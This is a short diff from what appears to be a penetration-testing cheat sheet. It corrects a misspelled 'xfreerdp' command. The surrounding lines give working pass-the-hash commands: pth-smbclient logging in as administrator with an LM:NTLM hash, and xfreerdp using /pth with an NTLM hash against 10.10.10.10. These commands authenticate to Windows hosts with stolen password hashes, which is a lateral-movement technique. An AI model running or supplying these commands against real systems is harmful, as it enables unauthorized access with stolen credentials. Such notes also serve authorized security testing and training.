@@ -16,5 +16,5 @@ pth-smbclient -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568
  
  # XfreeRDP
  apt-get install freerdp-x11
- xfreerpd /u:adminsitrator /pth:6F403D3166024568403A94C3A6561828 /v:10.10.10.10
+ xfreerdp /u:adminsitrator /pth:6F403D3166024568403A94C3A6561828 /v:10.10.10.10
  
